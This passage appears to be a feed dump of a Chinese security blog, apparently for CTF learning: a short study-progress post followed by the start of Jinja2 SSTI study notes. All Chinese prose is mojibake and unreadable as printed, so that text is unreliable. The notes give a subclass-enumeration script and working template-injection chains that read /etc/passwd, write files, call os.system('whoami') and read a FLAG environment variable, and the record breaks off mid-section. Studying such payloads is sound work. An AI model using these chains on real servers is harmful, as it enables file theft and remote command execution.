&lt;p>æœ€è¿‘æœ‰ç‚¹è‡ªé—­ï¼Œçœ‹ç€é‚£ä¹ˆå¤šå’Œæˆ‘å­¦ä¹ æ—¶é—´å·®ä¸å¤šçš„å¸ˆå‚…éƒ½å·²ç»ç›¸å½“ç›¸å½“åŽ‰å®³äº†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿåˆšå¼€å§‹ä¸€æ ·èœï¼Œæ»¡æ‰“æ»¡ç®—å­¦äº†ä¹ŸåŠå¹´å¤šäº†ï¼Œæ€Žä¹ˆå°±è¿™ä¹ˆèœå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå·®è·å¤ªå¤§äº†ï¼Œä»–å¦ˆçš„å°±æ˜¯èœå•Š&lt;/p>
&lt;p>çœ‹çœ‹åˆ«äººåšå®¢éƒ½å†™å¾—å•¥ï¼Œcveå¤çŽ°ï¼Œæ¼æ´žæŒ–æŽ˜ï¼Œæ¸—é€å®žæˆ˜ï¼Œå®‰å…¨ç ”ç©¶ï¼Œæˆ‘å‘¢ï¼Ÿå…¨æ˜¯äº’è”ç½‘æ¹¿åžƒåœ¾ï¼Œæ²¡ä¸€ç‚¹å«é‡‘é‡ï¼Œå°±ä¼šå†™ä¸€ç‚¹wpï¼Œè¿˜å¤§å¤šéƒ½æ˜¯å‚è€ƒäº†åˆ«äººçš„å†…å®¹ï¼Œç„¶åŽå†™ä¸€ç‚¹çŸ¥è¯†æ€»ç»“ï¼Œè·Ÿä¸ªå°å­¦ç”Ÿä¸€æ ·&lt;/p>
&lt;p>è¿™å‘¨ä¸‹äº†å†³å¿ƒæŠŠæ²¡ç”¨çš„è¯¾çš„å‡è¯·æŽ‰äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½åˆ©ç”¨èµ·æ¥ï¼Œåˆ«æ‘†äº†ï¼ŒçœŸåˆ«æ‘†äº†ï¼Œè¦å‡ºå¤§é—®é¢˜&lt;/p>
&lt;p>ä¸è¿‡æ€»ç»“æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼ŒçŽ°åœ¨çš„è¿›åº¦æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>phpååºåˆ—åŒ–ï¼šç¼º åŽŸç”Ÿç±»çš„å­¦ä¹ +è·Ÿä¸€äº›å®žé™…çš„é“¾å­&lt;/li>
&lt;li>pythonååºåˆ—åŒ–ï¼šå®Œ&lt;/li>
&lt;li>sqliï¼šå·®ä¸å¤šå®Œï¼Œè¿˜å¾—å¤šåšç‚¹é¢˜åŠ æ·±ç†è§£&lt;/li>
&lt;li>SSTIï¼šå®Œ&lt;/li>
&lt;li>æ–‡ä»¶ä¸Šä¼ ï¼šä¹‹å‰9æœˆæ€»ç»“åˆ°ä¸€åŠåŽ»æ‰“hvväº†&lt;/li>
&lt;li>php-fpmï¼šå®Œ&lt;/li>
&lt;li>GraphQLï¼šå®Œ&lt;/li>
&lt;/ul>
&lt;p>å¾ˆè–„å¼±çš„åœ°æ–¹éƒ½è¿˜æ²¡æŽŒæ¡ï¼ˆè¿™ä¸æ˜¯åºŸè¯ï¼‰ï¼Œå‡ ä¸ªæ€¥éœ€æ€»ç»“æŽŒæ¡çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ssrfï¼šä¸ç†Ÿç»ƒ&lt;/li>
&lt;li>xssï¼šåšé¢˜é‡åˆ°éƒ½æ˜¯èº²ç€èµ°&lt;/li>
&lt;li>jsåœ†å½¢æ±¡æŸ“ï¼šè·Ÿä¸Šé¢é‚£ä¸ªæ€»æ˜¯ä¸€èµ·å‡ºçŽ°&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>è¿˜æœ‰javaï¼Œè¿™ä¸ªå¿…é¡»å¾—å­¦&lt;/p>
&lt;p>ä¸å¤šè¯´äº†ï¼Œå†²ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>SSTIå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>æ¨¡æ¿æ¸²æŸ“å¯ä»¥å€ŸåŠ©ä»£ç æž„é€ ï¼ˆå¦‚æ¡ä»¶ã€å¾ªçŽ¯è¯­å¥ç­‰ï¼‰ååˆ†æ–¹ä¾¿çš„åŠ¨æ€å‘ˆçŽ°å†…å®¹ï¼Œä½†å¦‚æžœç¼–å†™ä¸å½“å®¹æ˜“è¢«æ”»å‡»è€…æ³¨å…¥æ¶æ„å†…å®¹ä»Žè€Œæš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œæ‰§è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„çŽ°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡åž‹ï¼Œæ˜¯Flaskæ¡†æž¶çš„ä¸€éƒ¨åˆ†&lt;/p>
&lt;p>Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»åž‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»åž‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨&lt;u>è¿‡æ»¤å™¨&lt;/u>ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åŽï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ï¼ˆè¿™å¾ˆæœ‰åˆ©äºŽæˆ‘ä»¬æž„é€ æ¶æ„çš„payloadï¼‰ï¼Œæ¯”å¦‚è¿™æ ·çš„æ¨¡æ¿å¯ä»¥ç”¨é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">Hello, {{name|capitalize}}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2ä¹Ÿæ”¯æŒæŽ§åˆ¶è¯­å¥ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„&lt;u>forè¯­å¥&lt;/u>çš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% for comment in comments %}
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% endfor %}
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹æ‰€ä»¥æœ‰æ¨¡æ¿æ¸²æŸ“çš„æ¼æ´žæ˜¯å› ä¸ºåœ¨æ¸²æŸ“ä¼ é€’è¿›åŽ»çš„å‚æ•°æ—¶æ¨¡æ¿å¯ä»¥ç›´æŽ¥è®¿é—®Pythonçš„ä¸€äº›å¯¹è±¡åŠæ–¹æ³•ï¼Œå¯ä»¥æž„é€ ä¸€ä¸ªé•¿é•¿çš„ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å†™&amp;amp;å‘½ä»¤æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>ï¼šä¿å­˜ç±»å®žä¾‹æˆ–å¯¹è±¡å®žä¾‹çš„å±žæ€§å˜é‡é”®å€¼å¯¹å­—å…¸&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªå®žä¾‹æ‰€å±žçš„ç±»ï¼›pythonä¸­çš„æ–°å¼ç±»ï¼ˆæ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±žæ€§&lt;code>__class&lt;/code>ç”¨äºŽèŽ·å–å½“å‰å®žä¾‹å¯¹åº”çš„ç±»&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£æžæ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æžï¼ˆå³MRO - Method Resolution Orderï¼‰&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›žä¸€ä¸ªç±»ç›´æŽ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æŽ¥çˆ¶ç±»ï¼‰&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>ï¼šè¿”å›žä¸€ä¸ªç±»ç›´æŽ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå•ä¸ªï¼‰ï¼ˆç›¸å½“äºŽ&lt;code>__bases__[0]&lt;/code>ï¼‰ï¼Œå’Œ&lt;code>__mro__&lt;/code>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>ï¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›žç±»çš„æ‰€æœ‰å­˜æ´»å­ç±»çš„å¼•ç”¨ï¼ˆè€Œéžå®žä¾‹ï¼‰ï¼›pythonä¸­çš„ç±»éƒ½ç»§æ‰¿è‡ªobjectï¼Œåªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„&lt;code>__subclasses__()&lt;/code>æ–¹æ³•å°±å¯ä»¥èŽ·å–æƒ³è¦çš„å­ç±»&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥èŽ·å–file, osç­‰æ¨¡å—&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>ï¼šè¿”å›žä¸ç”¨å¯¼å…¥æ¨¡å—å¯ä»¥ç›´æŽ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚int()ï¼Œlist()ç­‰å†…å»ºå‡½æ•°ï¼ŒæŸ¥çœ‹çš„æ–¹æ³•æ˜¯&lt;code>dir(__builtins__)&lt;/code>ã€€ã€€
&lt;ul>
&lt;li>åœ¨py2ä¸­&lt;code>__builtins__&lt;/code>æ¨¡å—æ˜¯è§£é‡Šå™¨è‡ªåŠ¨åˆ›å»ºçš„å¯¹äºŽ&lt;code>__builtin__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼Œå¹¶éž&lt;code>__buitin__&lt;/code>æœ¬èº«ï¼ˆåœ¨ä¸»æ¨¡å—ä¸­æ—¶ï¼Œæƒ…å†µç±»ä¼¼æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå˜é‡å¹¶å¯¹å®ƒåšä¸€æ¬¡å¼•ç”¨ä¼ é€’ï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘ç›¸åŒï¼›å½“ä¸æ˜¯ä¸»æ¨¡å— è€Œæ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå¯ä»¥è¢«å¯¼å…¥çš„æ¨¡å—æ—¶ï¼Œ&lt;code>__builtins__&lt;/code>å…¶å®žæ˜¯å¯¹&lt;code>__builtin__.__dict__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼‰&lt;/li>
&lt;li>åœ¨py3ä¸­&lt;code>__builtin__&lt;/code>è¢«å‘½åä¸º&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸Ž &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="æž„é€ çš„åŽŸç†">æž„é€ çš„åŽŸç†&lt;/h2>
&lt;p>ä¸€è¨€ä»¥è”½ä¹‹ï¼šé€šè¿‡ä¸€ä¸ªé•¿é•¿çš„è°ƒç”¨ç»§æ‰¿é“¾æ¥å°†å†…å»ºçš„å‡½æ•°æˆ–æ¨¡å—æªå‡ºæ¥ç”¨&lt;/p>
&lt;h3 id="step1---æ‰¾åˆ°åŸºç±»object">step1 - æ‰¾åˆ°åŸºç±»object&lt;/h3>
&lt;p>é€šè¿‡å­—ç¬¦ä¸²ã€å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„å’Œå¾ˆç‰¹æ®Šçš„requestæ¥èŽ·å–åŸºç±»objectï¼Œmroå’Œbases[0]å‡å¯ï¼ˆæˆ–è€…æ˜¯base ä¸€æ ·çš„æ•ˆæžœï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---èŽ·å¾—èƒ½ç”¨çš„å­ç±»">step2 - èŽ·å¾—â€œèƒ½ç”¨çš„â€å­ç±»&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›žobjectåŸºç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å…¶ä¸­å«æœ‰&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>æ¨¡å—çš„å­ç±»ï¼›è¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å•ç‹¬å¯»æ‰¾ç‰¹å®šå­ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æƒ³è¦çš„æ¨¡å—æ‰¾åˆ°å¯¹åº”çš„å­ç±»ï¼Œè¿”å›žç´¢å¼•ä½ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">åˆ°è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°çš„&lt;/p>
&lt;p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„payloadå·²ç»æž„é€ å¥½ä¸€åŠäº†ï¼ˆä»¥ä¸‹indexå‡æŒ‡æˆ‘ä»¬éœ€è¦çš„subclassçš„ç´¢å¼•ä½ç½®ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce">step3 - è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>æ˜¯py2çš„ä¸“å±žï¼Œç›´æŽ¥å¯ä»¥ç”¨&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>æ¨¡å—å°±ä¸å¿…è¯´äº†ï¼Œæœ‰&lt;code>system()&lt;/code>å¯ä»¥ç›´æŽ¥rceçš„å‡½æ•°ï¼›åœ¨py2ä¸­è¿™ä¸¤ä¸ªå­ç±»å¯ä»¥ç›´æŽ¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸å«Œéº»çƒ¦çš„è¿˜å¯ä»¥å†å¥—ä¸€å±‚ï¼Œç”¨&lt;code>linecache&lt;/code>æ¥è°ƒç”¨&lt;code>os&lt;/code>ï¼Œpy2ä¸­æœ‰è¿™ä¸¤ä¸ªç±»å«æœ‰&lt;code>linecache&lt;/code>æ¨¡å—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
